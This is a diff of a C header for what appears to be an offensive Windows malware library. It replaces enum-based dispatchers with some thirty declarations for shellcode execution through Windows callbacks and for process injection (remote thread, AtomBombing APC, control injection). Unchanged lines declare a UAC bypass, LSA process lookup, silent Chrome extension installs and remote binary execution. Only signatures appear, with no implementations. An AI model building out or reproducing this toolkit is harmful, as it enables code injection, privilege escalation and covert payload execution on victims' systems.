@@ -38,72 +38,6 @@
 #define InlineGetCurrentThread ((HANDLE)(LONG_PTR)-2)
 #define InlineGetCurrentProcess (HANDLE)((HANDLE)-1)
 
-
-/*******************************************
- SHELLCODE VIA CALLBACK ROUTINE INFORMATION
-*******************************************/
-
-/*
-
-    LPBYTE Payload
-        a pointer to shellcode
-    DWORD dwLengthOfPayloadInBytes
-        the length of the payload in bytes
-    Enum SHELLCODE_EXECUTION_METHOD
-        specifies shellcode execution method
-        
-
-    example:
-    SHELLCODE_EXECUTION_INFORMATION Sei = { 0 };
-    Sei.Payload = Shellcode; //pointer to shellcode
-    Sei.dwLengthOfPayloadInBytes = 280; //whatever the length is
-    Sei.Method = E_CERTENUMSYSTEMSTORE; //method from SHELLCODE_EXECUTION_METHOD
-*/
-
-typedef enum SHELLCODE_EXECUTION_METHOD {
-    E_CDEFFOLDERMENU_CREATE2 = 1,
-    E_CERTENUMSYSTEMSTORE, //2
-    E_CERTENUMSYSTEMSTORELOCATION, //3
-    E_CERTFINDCHAININSTORE, //4 UNSTABLE, FAILS
-    E_ENUMCHILDWINDOWS, //5
-    E_ENUMDATEFORMATSW, //6
-    E_ENUMDESKTOPWINDOWS, //7
-    E_ENUMDESKTOPSW, //8
-    E_ENUMDIRTREEW, //9
-    E_ENUMDISPLAYMONITORS, //10
-    E_ENUMFONTFAMILIESEXW, //11
-    E_ENUMFONTSW, //12
-    E_ENUMICMPROFILESW, //13 UNSTABLE, FAILS
-    E_ENUMLANGUAGEGROUPLOCALESW, //14
-    E_ENUMOBJECTS, //15
-    E_ENUMPROPSEXW, //16 NOT IMPLEMENTED!
-    E_ENUMRESOURCETYPESEXW, //17
-    E_ENUMSYSTEMCODEPAGES, //18
-    E_ENUMSYSTEMGEOID, //19
-    E_ENUMSYSTEMLANGUAGEGROUPS, //20
-    E_ENUMSYSTEMLOCALESEX, //20
-    E_ENUMTHREADWINDOWS, //21
-    E_ENUMTIMEFORMATSEX, //22
-    E_ENUMUILANGUAGESW, //23
-    E_ENUMWINDOWSTATIONSW, //24
-    E_ENUMWINDOWS, //25
-    E_ENUMPROPSW, //26 UNSTABLE, FAILS
-    E_MESSAGEBOXINDIRECT, //27 UNSTABLE, FAILS
-    E_PERFSTARTPROVIDEREX, //28 UNSTABLE, FAILS
-    E_MINIDUMPWRITEDUMP, //29 UNSTABLE, FAILS
-    E_ENUMERATELOADEDMODULES, //30
-    E_ENUMPAGEFILESW, //31
-    E_ENUMPWRSCHEMES, //32
-    E_DNSQUERYEX, //33
-    E_RTLUSERFIBERSTART //34 UNSTABLE, FAILS
-}SHELLCODE_EXECUTION_METHOD, *PSHELLCODE_EXECUTION_METHOD;
-
-typedef struct __SHELLCODE_EXECUTION_INFORMATION {
-    LPBYTE Payload;
-    DWORD dwLengthOfPayloadInBytes;
-    DWORD MethodEnum;
-}SHELLCODE_EXECUTION_INFORMATION, * PSHELLCODE_EXECUTION_INFORMATION;
-
 /*******************************************
  RAD HARDWARE BREAKPOINT HOOKING ENGINE DATA
 *******************************************/
@@ -128,53 +62,6 @@ typedef struct DESCRIPTOR_ENTRY {
 inline CRITICAL_SECTION CriticalSection = { 0 };
 inline DESCRIPTOR_ENTRY* Head = NULL;
 inline HARDWARE_ENGINE_INIT_SETTINGS_GLOBAL GlobalHardwareBreakpointObject;
-
-/*******************************************
- PROCESS INJECTION INFORMATION
-*******************************************/
-
-/*
-
-    LPBYTE Payload
-        a pointer to shellcode
-    DWORD dwLengthOfPayloadInBytes
-        the length of the payload in bytes
-    Enum PROCESS_INJECTION_METHOD
-        specifies process injection method
-    DWORD TargetPid
-        specify target process
-    [OPTIONAL] DWORD ThreadId 
-        specify target process thread id (depends PROCESS_INJECTION_METHOD)
-    [OPTIONAL] TCHAR PathToFile //depends on if youre using W or A suffix
-        path to DLL to load (depends PROCESS_INJECTION_METHOD)
-        
-
-    example:
-    PROCESS_INJECTION_INFORMATION Pii = { 0 };
-    Sei.Payload = Shellcode; //pointer to shellcode
-    Pii.dwLengthOfPayloadInBytes = 280; //whatever the length is
-    Pii.Method = E_PROCESSREFLECTION; //method from PROCESS_INJECTION_METHOD
-    Pii.ProcessId = 100; //whatever the process id is, this is just a random number lol
-    Pii.ThreadId = 0; //not required for this method
-    Pii.PathToFile = DllPath; pointer to path of dll you want loaded, only WCHAR supported
-
-*/
-
-typedef enum PROCESS_INJECTION_METHOD {
-    E_WRITEPROCESSMEMORY_CREATEREMOTETHREAD_EXECUTESHELLCODE, //0
-    E_PROCESS_REFLECTION_EXECUTESHELLCODE, //1 UNIMPLEMENTED
-    E_CTRL_INJECT, //2
-    E_QUEUE_USER_APC //3
-}PROCESS_INJECTION_METHOD, * PPROCESS_INJECTION_METHOD;
-
-typedef struct __PROCESS_INJECTION_INFORMATION {
-    LPBYTE Payload;
-    DWORD dwLengthOfPayloadInBytes;
-    DWORD MethodEnum;
-    DWORD ProcessId;
-    DWORD ThreadId;
-    PWCHAR PathToFile;
-}PROCESS_INJECTION_INFORMATION, *PPROCESS_INJECTION_INFORMATION;
 
 
 
@@ -354,18 +241,45 @@ BOOL UacBypassFodHelperMethodW(_In_ PWCHAR PathToBinaryToExecute, _Inout_ PPROCE
 DWORD MpfGetLsaPidFromRegistry(VOID);
 DWORD MpfGetLsaPidFromServiceManager(VOID);
 DWORD MpfGetLsaPidFromNamedPipe(VOID);
-BOOL ShellcodeExecutionViaFunctionCallbackMain(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
 DWORD MpfComMonitorChromeSessionOnce(VOID);
 DWORD MpfExecute64bitPeBinaryInMemoryFromByteArrayNoReloc(_In_ PBYTE BinaryImage);
 BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginW(_In_ PWCHAR ExtensionIdentifier);
 BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginA(_In_ PCHAR ExtensionIdentifier);
 BOOL MpfLolExecuteRemoteBinaryByAppInstallerW(_In_ PWCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
 BOOL MpfLolExecuteRemoteBinaryByAppInstallerA(_In_ PCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
-DWORD ProcessInjectionMain(_In_ PPROCESS_INJECTION_INFORMATION Pii);
 BOOL MpfProcessInjectionViaProcessReflection(_In_ PBYTE Shellcode, _In_ DWORD dwSizeOfShellcodeInBytes, _In_ DWORD TargetPid);
 BOOL MpfExtractMaliciousPayloadFromZipFileNoPasswordW(_In_ PWCHAR FullPathToZip, _In_ PWCHAR FullPathToExtractionDirectory);
 BOOL MpfExtractMaliciousPayloadFromZipFileNoPasswordA(_In_ PCHAR FullPathToZip, _In_ PCHAR FullPathToExtractionDirectory);
-
+BOOL MpfPiWriteProcessMemoryCreateRemoteThread(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetProcessId);
+BOOL MpfPiQueueUserAPCViaAtomBomb(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetThreadId);
+BOOL MpfPiControlInjection(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetProcessId);
+BOOL MpfSceViaEnumChildWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaCDefFolderMenu_Create2(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaCertEnumSystemStore(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaCertEnumSystemStoreLocation(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumDateFormatsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumDesktopWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumDesktopsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumDirTreeW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumDisplayMonitors(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumFontFamiliesExW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumFontsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumLanguageGroupLocalesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumObjects(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumResourceTypesExW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumSystemCodePagesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumSystemGeoID(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumSystemLanguageGroupsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumSystemLocalesEx(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumThreadWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumTimeFormatsEx(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumUILanguagesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumWindowStationsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumerateLoadedModules64(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaK32EnumPageFilesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaEnumPwrSchemes(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
+BOOL MpfSceViaMessageBoxIndirectW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes); //Unstable, only triggers on certain button presses, prone to crashing
 
 
 /*******************************************
@@ -454,6 +368,6 @@ INT __demonstration_WinMain(VOID); //hook sleep
 /*******************************************
  GENERIC SHELLCODE PAYLOADS FOR TESTINGS
 *******************************************/
-PCHAR GenericShellcodeHelloWorldMessageBoxA(VOID);
-PCHAR GenericShellcodeOpenCalcExitThread(VOID);
-PCHAR GenericShellcodeHelloWorldMessageBoxAEbFbLoop(VOID);
+PCHAR GenericShellcodeHelloWorldMessageBoxA(_Out_ PDWORD SizeOfShellcodeInBytes);
+PCHAR GenericShellcodeOpenCalcExitThread(_Out_ PDWORD SizeOfShellcodeInBytes);
+PCHAR GenericShellcodeHelloWorldMessageBoxAEbFbLoop(_Out_ PDWORD SizeOfShellcodeInBytes);
